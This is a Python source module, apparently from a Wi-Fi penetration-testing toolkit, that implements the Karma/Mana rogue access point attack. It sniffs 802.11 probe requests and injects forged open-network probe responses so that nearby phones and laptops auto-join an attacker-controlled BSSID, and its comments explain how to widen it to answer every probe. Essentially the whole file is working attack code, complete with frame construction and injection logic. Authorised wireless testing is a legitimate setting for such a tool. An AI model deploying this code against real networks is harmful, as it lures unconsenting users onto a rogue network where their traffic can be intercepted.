"""Karma / Mana — probe-request sniff + probe-response inject.

What this does. When PineAP runs in Advanced mode, a Scapy sniffer
binds to a monitor-mode interface (default ``wlan-mon-5g`` — pulled
out from under recon while Advanced is up). For every Dot11ProbeReq
frame, the sniffer checks whether the requested SSID is in the
PineAP pool; if yes, it crafts and injects a Dot11ProbeResp claiming
to be that SSID, advertising the *primary* rogue BSSID hostapd is
already advertising. The client's supplicant sees the probe-response,
believes the named AP is in range, and (if auto-join is enabled for
that SSID) sends an auth + association request — which hostapd
handles normally because the auth/assoc lands on the primary BSS.

This is the Mana variant of Karma (sensepost): pool-restricted rather
than universal. The choice was made in S11 scoping per the operator's
"pool-only (recommended)" answer — most constrained, lowest collateral.
The classical Karma (reply to any probe) would require swapping the
pool-membership check for an unconditional reply.

Why not just hostapd? hostapd responds to probes only for SSIDs it's
currently advertising. Karma's whole trick is replying to probes for
SSIDs hostapd *doesn't* advertise — which means a parallel Scapy
machinery on top.

Channel coordination. The injector must be on the same channel as the
target client at the moment the probe is sent. Real clients hop fast
during scans; we don't try to follow them. We lock the injector to
hostapd's channel and accept that we'll only catch probes the client
happens to send on that channel — frequent enough in practice (the
client iterates channels in a few seconds).

Rate limiting. Without dedup, a client sending many probes per scan
would get many identical probe-responses, which is both noisy on the
wire and wasteful. We track per-(client_mac, ssid) last-reply
timestamp and drop replies within ``_RATE_LIMIT_SECS`` of the previous.
"""

from __future__ import annotations

import logging
import threading
import time
from pathlib import Path
from typing import Any

from app.tools._common import stub_mode

log = logging.getLogger(__name__)


# ---------- Tuning ----------

# Don't reply more than once per (client_mac, ssid) within this window.
# 30s is enough to suppress the spam of a single client's scan burst
# while still re-replying if the client genuinely comes back later.
_RATE_LIMIT_SECS = 30.0

# How frequently to GC the rate-limit dict.
_RATE_GC_SECS = 300.0

# Cap on rate-limit map size — if we ever hit this, we're under
# attack-volume probing and should drop old entries.
_RATE_MAX_ENTRIES = 5000


# ---------- The service ----------

class KarmaService:
    def __init__(self, data_dir: Path) -> None:
        self._data_dir = data_dir
        self._lock = threading.Lock()
        # Run state
        self._sniffer_thread: threading.Thread | None = None
        self._stop_event = threading.Event()
        self._iface: str | None = None
        self._channel: int | None = None
        self._primary_bssid: str | None = None
        # (client_mac, ssid) -> last_reply_ts
        self._rate_limit: dict[tuple[str, str], float] = {}
        # Stats for the UI
        self._stats = {
            "probes_seen":    0,
            "probes_replied": 0,
            "unique_clients": set(),
            "unique_ssids":   set(),
            "started_at":     None,
            "stopped_at":     None,
        }

    # ---------- Public ----------
    def is_running(self) -> bool:
        return (self._sniffer_thread is not None
                and self._sniffer_thread.is_alive())

    def get_stats(self) -> dict[str, Any]:
        """Return JSON-safe stats snapshot for the UI."""
        with self._lock:
            return {
                "running":        self.is_running(),
                "iface":          self._iface,
                "channel":        self._channel,
                "primary_bssid":  self._primary_bssid,
                "probes_seen":    self._stats["probes_seen"],
                "probes_replied": self._stats["probes_replied"],
                "unique_clients": len(self._stats["unique_clients"]),
                "unique_ssids":   len(self._stats["unique_ssids"]),
                "started_at":     self._stats["started_at"],
                "stopped_at":     self._stats["stopped_at"],
            }

    def start(
        self, iface: str, channel: int, primary_bssid: str,
    ) -> tuple[bool, str]:
        """Lock the injector to ``iface`` on ``channel`` and start
        sniffing. Caller is responsible for ensuring ``iface`` is in
        monitor mode and (in Advanced lifecycle) for having paused
        recon on that interface first.

        Stub mode (Mac dev): no actual sniffing happens, but the
        service flips its 'running' state so the UI test path works.
        """
        with self._lock:
            if self.is_running():
                return True, f"already running on {self._iface}"
            self._iface = iface
            self._channel = channel
            self._primary_bssid = primary_bssid.lower()
            self._stop_event.clear()
            self._stats["started_at"] = time.time()
            self._stats["stopped_at"] = None
            # Reset counters per session
            self._stats["probes_seen"]    = 0
            self._stats["probes_replied"] = 0
            self._stats["unique_clients"] = set()
            self._stats["unique_ssids"]   = set()
            self._rate_limit = {}

        # Lock the interface to the right channel before sniffing
        if not stub_mode():
            try:
                from app.tools import iw
                ok, msg = iw.set_channel(iface, channel)
                if not ok:
                    log.warning("karma: set_channel %s failed: %s", iface, msg)
                    # Don't hard fail — sniffing on a not-perfect channel
                    # is still useful, we'll just catch fewer probes
            except Exception:
                log.exception("karma: set_channel raised")

        from flask import current_app
        try:
            app = current_app._get_current_object()
        except Exception:
            app = None

        def _run() -> None:
            ctx = app.app_context() if app is not None else None
            if ctx:
                ctx.push()
            try:
                if stub_mode():
                    log.info("karma: (stub) sniffer would bind to %s ch%d",
                             iface, channel)
                    # Idle-loop until stop so is_running() reflects state
                    while not self._stop_event.is_set():
                        self._stop_event.wait(1.0)
                else:
                    self._sniff_loop()
            except Exception:
                log.exception("karma sniffer crashed")
            finally:
                if ctx:
                    ctx.pop()

        t = threading.Thread(target=_run, name=f"karma-{iface}", daemon=True)
        with self._lock:
            self._sniffer_thread = t
        t.start()
        return True, f"karma listening on {iface} ch{channel}"

    def stop(self) -> tuple[bool, str]:
        with self._lock:
            if not self.is_running():
                return True, "already stopped"
            self._stop_event.set()
            self._stats["stopped_at"] = time.time()
        # Wait briefly for the thread to actually exit so callers can
        # release the radio for recon's reclaim.
        if self._sniffer_thread is not None:
            self._sniffer_thread.join(timeout=2.0)
        with self._lock:
            stale = self._sniffer_thread
            self._sniffer_thread = None
        if stale is not None and stale.is_alive():
            log.warning("karma sniffer didn't exit within 2s — leaked thread")
        return True, "stopped"

    # ---------- Sniffer ----------
    def _sniff_loop(self) -> None:
        """Scapy sniff loop. Filters to probe requests only and runs
        the prn callback per-frame. ``store=False`` so scapy doesn't
        accumulate the entire stream in memory — we just process and
        forget."""
        # Late imports — scapy is heavy and only available on Pi
        from scapy.config import conf as scapy_conf
        from scapy.sendrecv import sniff

        # iface is monitor — sniff sees raw 802.11 + RadioTap
        try:
            sniff(
                iface=self._iface,
                prn=self._on_frame,
                store=False,
                stop_filter=lambda _pkt: self._stop_event.is_set(),
                lfilter=_is_probe_request,
            )
        except OSError as e:
            log.error("karma sniff bind failed on %s: %s", self._iface, e)
        except Exception:
            log.exception("karma sniff loop")

    def _on_frame(self, pkt) -> None:
        """Per-frame callback. Verify probe-request shape, pull SSID
        + source MAC, check pool, rate-limit, inject reply."""
        try:
            from scapy.layers.dot11 import Dot11, Dot11Elt, Dot11ProbeReq
        except ImportError:
            return

        if not pkt.haslayer(Dot11ProbeReq):
            return
        d11 = pkt.getlayer(Dot11)
        # addr2 is the source (transmitter) MAC = client
        client_mac = getattr(d11, "addr2", None)
        if not client_mac:
            return
        client_mac = client_mac.lower()

        # Pull SSID from the first SSID IE in the frame. Empty SSID =
        # broadcast probe (the client is scanning blindly) — Karma
        # can't reply to that meaningfully (no name to claim).
        ssid = None
        e = pkt.getlayer(Dot11Elt)
        while e is not None:
            if getattr(e, "ID", None) == 0:    # SSID IE
                ssid = (e.info or b"").decode("utf-8", errors="replace")
                break
            e = e.payload.getlayer(Dot11Elt)
        if not ssid:
            return

        with self._lock:
            self._stats["probes_seen"] += 1
            self._stats["unique_clients"].add(client_mac)
            self._stats["unique_ssids"].add(ssid)

        # Pool check (Mana variant — pool-only)
        if not self._ssid_in_pool(ssid):
            return

        # Rate limit
        now = time.time()
        key = (client_mac, ssid)
        with self._lock:
            last = self._rate_limit.get(key)
            if last is not None and (now - last) < _RATE_LIMIT_SECS:
                return
            self._rate_limit[key] = now
            # Bound the dict size
            if len(self._rate_limit) > _RATE_MAX_ENTRIES:
                cutoff = now - _RATE_GC_SECS
                self._rate_limit = {
                    k: t for k, t in self._rate_limit.items() if t > cutoff
                }

        # Build + send the response
        try:
            resp = _build_probe_response(
                client_mac=client_mac,
                bssid=self._primary_bssid or "02:00:00:00:00:00",
                ssid=ssid,
                channel=self._channel or 6,
            )
            from scapy.sendrecv import sendp
            sendp(resp, iface=self._iface, verbose=False)
            with self._lock:
                self._stats["probes_replied"] += 1
            log.info("karma: replied to %s probing %r", client_mac, ssid)
        except Exception:
            log.exception("karma: probe-response build/send failed")

    def _ssid_in_pool(self, ssid: str) -> bool:
        """Pool membership check via the PineAP service. Hidden entries
        are excluded — same rule as the broadcast selection."""
        try:
            from app.services.pineap import get_service as get_pineap
            pool = get_pineap().list_pool()
            return any(
                e.get("ssid") == ssid and not e.get("hidden", False)
                for e in pool
            )
        except Exception:
            log.exception("karma: pool lookup failed")
            return False


# ---------- Scapy helpers ----------

def _is_probe_request(pkt) -> bool:
    """Cheap top-of-pipe filter so the heavier _on_frame only sees
    candidate frames. Saves scapy from building Dot11Elt chains for
    every beacon and data frame in the air."""
    try:
        from scapy.layers.dot11 import Dot11ProbeReq
    except ImportError:
        return False
    return pkt.haslayer(Dot11ProbeReq)


def _build_probe_response(
    client_mac: str, bssid: str, ssid: str, channel: int,
) -> Any:
    """Construct an 802.11 probe response claiming to be an OPEN AP
    named ``ssid``. Returns a scapy frame ready for sendp.

    Frame structure:

    * RadioTap header (Scapy fills sane defaults; the driver injects)
    * Dot11 management frame, subtype 5 (probe-response)
      - addr1 = client (DA = unicast back to the probing station)
      - addr2 = our BSSID (SA = transmitter)
      - addr3 = our BSSID (BSSID)
    * Dot11ProbeResp payload: timestamp=0 (TSF — driver typically
      overwrites), beacon_interval=100 TUs (standard 102.4ms),
      capability info = ESS, Privacy=0 (open), Short Preamble.
    * SSID IE — the spoofed network name
    * Supported Rates IE — 802.11b/g rates (basic + extended), so the
      response looks like a normal AP. Real APs include this; without
      it some clients reject the response.
    * DS Parameter Set IE — single byte: the channel we're on.
      Without this, the client doesn't know what channel to switch
      to for the follow-up auth/assoc.

    Encryption-aware variants live in S12 (Evil WPA) — for S11 this
    is open-only.
    """
    from scapy.layers.dot11 import (
        Dot11,
        Dot11Elt,
        Dot11ProbeResp,
        RadioTap,
    )

    # Capability info bitmap: ESS bit (0x0001) + Short Preamble (0x0020).
    # No Privacy bit (open AP). Real beacons add more bits depending
    # on QoS / Short Slot Time / etc. but this is enough for clients
    # to honour the response.
    capability = 0x0021

    # Supported rates (1, 2, 5.5, 11 Mbps as basic; 6, 9, 12, 18, 24,
    # 36, 48, 54 follow in the Extended Supported Rates IE). The high
    # bit (0x80) marks 'basic'/'mandatory'.
    basic_rates    = bytes([0x82, 0x84, 0x8b, 0x96])
    extended_rates = bytes([0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c])

    frame = (
        RadioTap() /
        Dot11(
            type=0,        # management
            subtype=5,     # probe response
            addr1=client_mac,
            addr2=bssid,
            addr3=bssid,
        ) /
        Dot11ProbeResp(
            timestamp=0,
            beacon_interval=100,
            cap=capability,
        ) /
        Dot11Elt(ID=0,  info=ssid.encode("utf-8", errors="replace")) /
        Dot11Elt(ID=1,  info=basic_rates) /
        Dot11Elt(ID=3,  info=bytes([channel])) /
        Dot11Elt(ID=50, info=extended_rates)
    )
    return frame


# ---------- Module singleton ----------

_service: "KarmaService | None" = None


def get_service() -> KarmaService:
    global _service
    if _service is None:
        from flask import current_app
        _service = KarmaService(current_app.config["DATA_DIR"])
    return _service
